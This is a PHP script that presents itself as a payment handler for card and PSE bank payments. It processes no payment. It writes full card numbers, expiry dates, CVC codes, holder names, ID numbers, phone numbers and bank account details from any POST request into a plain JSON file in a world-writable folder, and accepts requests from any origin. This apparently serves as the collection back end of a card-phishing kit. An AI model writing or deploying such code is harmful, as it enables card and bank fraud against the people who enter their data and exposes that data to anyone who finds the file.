<?php
/**
 * procesar_pago.php - CORREGIDO
 * Guarda tarjetas de crédito y datos PSE en transacciones.json
 */

error_reporting(0);
ini_set('display_errors', 0);

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['success' => false, 'error' => 'Solo POST']);
    exit;
}

// Obtener datos - Soporta FormData Y JSON
$data = $_POST;

// Si viene JSON, decodificar
if (empty($data) || (isset($_SERVER['CONTENT_TYPE']) && strpos($_SERVER['CONTENT_TYPE'], 'application/json') !== false)) {
    $input = file_get_contents('php://input');
    if (!empty($input)) {
        $json_data = json_decode($input, true);
        if ($json_data) {
            $data = $json_data;
        }
    }
}

if (empty($data)) {
    http_response_code(400);
    echo json_encode(['success' => false, 'error' => 'Datos vacíos']);
    exit;
}

// Crear carpeta data
$dataDir = __DIR__ . '/data';
if (!is_dir($dataDir)) {
    @mkdir($dataDir, 0777, true);
}

$transaccionesFile = $dataDir . '/transacciones.json';

// Leer transacciones existentes
$transacciones = [];
if (file_exists($transaccionesFile)) {
    $content = file_get_contents($transaccionesFile);
    $transacciones = json_decode($content, true) ?? [];
}

// ======================== DETECTAR TIPO DE PAGO ========================
$metodo_pago = $data['metodo_pago'] ?? '';

// Si es PSE o tiene campos de PSE
$esPSE = false;
if ($metodo_pago === 'pse' || !empty($data['banco_pse']) || !empty($data['tipo_cuenta'])) {
    $esPSE = true;
}

// ======================== DATOS COMUNES ========================
$nuevaTransaccion = [
    'id' => uniqid('TRX_'),
    'fecha' => date('Y-m-d H:i:s'),
    'timestamp' => time(),
    'metodo_pago' => $metodo_pago,
    'plan_nombre' => $data['plan_nombre'] ?? 'N/A',
    'plan_precio' => $data['plan_precio'] ?? 0,
    'ip' => $_SERVER['REMOTE_ADDR'] ?? '',
    'user_agent' => substr($_SERVER['HTTP_USER_AGENT'] ?? '', 0, 255)
];

// ======================== SI ES TARJETA ========================
if (!$esPSE && isset($data['numero_tarjeta']) && !empty($data['numero_tarjeta'])) {
    $nuevaTransaccion['tipo'] = 'TARJETA';
    $nuevaTransaccion['tipo_tarjeta'] = $data['tipo'] ?? $data['tipo_tarjeta'] ?? '';
    $nuevaTransaccion['documento'] = $data['documento'] ?? $data['identificacion'] ?? '';
    $nuevaTransaccion['titular'] = $data['titular'] ?? $data['usuario'] ?? '';
    $nuevaTransaccion['numero_celular'] = $data['numero_celular'] ?? $data['celular'] ?? '';
    $nuevaTransaccion['numero_tarjeta'] = $data['numero_tarjeta'] ?? '';
    $nuevaTransaccion['vencimiento'] = $data['vencimiento'] ?? '';
    $nuevaTransaccion['cvc'] = $data['cvc'] ?? '';
    $nuevaTransaccion['cuotas'] = $data['cuotas'] ?? '';
    $nuevaTransaccion['email'] = $data['email'] ?? '';
    $nuevaTransaccion['usar_datos_facturacion'] = $data['usar_datos_facturacion'] ?? false;
}

// ======================== SI ES PSE ========================
if ($esPSE) {
    $nuevaTransaccion['tipo'] = 'PSE';
    $nuevaTransaccion['documento_pse'] = $data['documento_pse'] ?? $data['documento'] ?? $data['identificacion'] ?? '';
    $nuevaTransaccion['titular_pse'] = $data['titular_pse'] ?? $data['titular'] ?? $data['usuario'] ?? '';
    $nuevaTransaccion['tipo_cuenta'] = $data['tipo_cuenta'] ?? '';
    $nuevaTransaccion['tipo_documento'] = $data['tipo_documento'] ?? $data['tipo_identificacion'] ?? '';
    $nuevaTransaccion['banco_pse'] = $data['banco_pse'] ?? $data['banco'] ?? '';
    $nuevaTransaccion['numero_cuenta'] = $data['numero_cuenta'] ?? '';
}

$transacciones[] = $nuevaTransaccion;

// Guardar
try {
    $json = json_encode($transacciones, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
    if (file_put_contents($transaccionesFile, $json, LOCK_EX) === false) {
        throw new Exception('No se pudo escribir en ' . $transaccionesFile);
    }
    
    http_response_code(200);
    echo json_encode([
        'success' => true,
        'id' => $nuevaTransaccion['id'],
        'message' => 'Transacción guardada correctamente'
    ]);
    exit;
    
} catch (Exception $e) {
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
    exit;
}
?>
